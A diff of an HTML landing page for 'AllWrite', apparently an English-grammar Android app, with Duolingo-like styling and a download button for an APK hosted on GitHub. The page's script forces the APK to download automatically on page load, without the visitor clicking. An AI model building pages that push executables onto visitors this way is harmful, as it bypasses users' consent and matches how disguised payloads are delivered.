@@ -1,67 +1,81 @@
-<loop>
 <style>
-body {
+  body {
     margin: 0;
     background: #101010;
-}
-
-loop {
+    font-family: 'Fredoka', sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
-    overflow: hidden;
-}
-
-loop .title {
-    font-family: 'Fredoka', sans-serif;
-    font-size: 80px;
-    font-weight: 700;
-    color: #FFC800; /* Duolingo Yellow */
+    color: white;
     text-align: center;
-    letter-spacing: -1.5px;
-    /* Elegant soft bounce with subtle scale-in */
-    animation: elegantEntrance 3s cubic-bezier(0.19, 1, 0.22, 1) infinite;
-}
+  }
 
-@keyframes elegantEntrance {
-    0% {
-        opacity: 0;
-        transform: translateY(40px) scale(0.9);
-        filter: blur(10px);
-    }
-    15% {
-        opacity: 1;
-        transform: translateY(0) scale(1.05);
-        filter: blur(0);
-    }
-    25% {
-        transform: scale(1);
-    }
-    85% {
-        opacity: 1;
-        transform: translateY(0) scale(1);
-        filter: blur(0);
-    }
-    100% {
-        opacity: 0;
-        transform: translateY(-20px) scale(0.95);
-        filter: blur(5px);
-    }
-}
+  [container] {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 24px;
+  }
+
+  [title] {
+    font-size: 48px;
+    font-weight: 700;
+    color: #FFC800;
+    margin: 0;
+  }
+
+  [subtitle] {
+    font-size: 18px;
+    color: #AFAFAF;
+    margin-bottom: 8px;
+  }
+
+  /* Gold Button Style */
+  [btn-gold] {
+    cursor: pointer;
+    background: #FFC800;
+    color: #101010;
+    padding: 16px 32px;
+    border-radius: 16px;
+    font-size: 20px;
+    font-weight: 700;
+    text-transform: uppercase;
+    text-decoration: none;
+    transition: filter 0.2s;
+    /* Duolingo 3D Border Effect */
+    border: none;
+    box-shadow: 0 4px 0 #D4A700;
+    position: relative;
+  }
+
+  [btn-gold]:active {
+    box-shadow: 0 0 0 #D4A700;
+    transform: translateY(4px);
+  }
 </style>
 
 <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@700&display=swap" rel="stylesheet">
 
-<div class="title">All Write</div>
-</loop>
+<div container>
+  <h1 title>AllWrite</h1>
+  <p subtitle>Master English grammar with ease.</p>
+  
+  <a href="https://github.com/selhue/allwrite/raw/refs/heads/main/allow/dl/Allwrite.apk" 
+     download="Allwrite.apk" 
+     btn-gold>
+    Download Now
+  </a>
+</div>
+
 <script>
-window.onload = function () {
-    const link = document.createElement('a');
-    link.href = "https://github.com/selhue/allwrite/raw/refs/heads/main/allow/dl/latest.apk";
-    link.download = "latest3.apk";
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-};
+  // Automatic trigger
+  window.onload = function () {
+    const dl = document.createElement('a');
+    dl.href = "https://github.com/selhue/allwrite/raw/refs/heads/main/allow/dl/Allwrite.apk";
+    dl.download = "Allwrite.apk";
+    document.body.appendChild(dl);
+    dl.click();
+    document.body.removeChild(dl);
+  };
 </script>
